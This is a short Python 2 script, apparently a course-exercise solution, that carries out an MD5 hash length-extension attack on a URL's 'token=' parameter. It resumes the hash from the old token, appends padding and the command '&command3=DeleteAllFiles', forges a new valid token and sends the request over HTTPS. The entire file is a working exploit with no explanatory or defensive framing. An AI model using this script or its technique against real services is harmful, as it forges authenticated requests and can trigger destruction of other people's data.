#!/usr/bin/python

import httplib, urlparse, sys, urllib
from pymd5 import md5, padding

# parse hash and message from URL
url = sys.argv[1]
hashStart = url.find("token=") + 6
hashEnd = url.find("&", hashStart)

oldHash = url[hashStart:hashEnd]
message = url[hashEnd+1:]
padding = padding(8*8 + len(message)*8)
exploit = "&command3=DeleteAllFiles"

# append exploit
h = md5(state=oldHash.decode("hex"), count=512)
h.update(exploit)
newHash = h.hexdigest()

# update URL
url = url[:hashStart] + newHash + url[hashEnd:] + urllib.quote(padding) + exploit

# query and print
parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPSConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
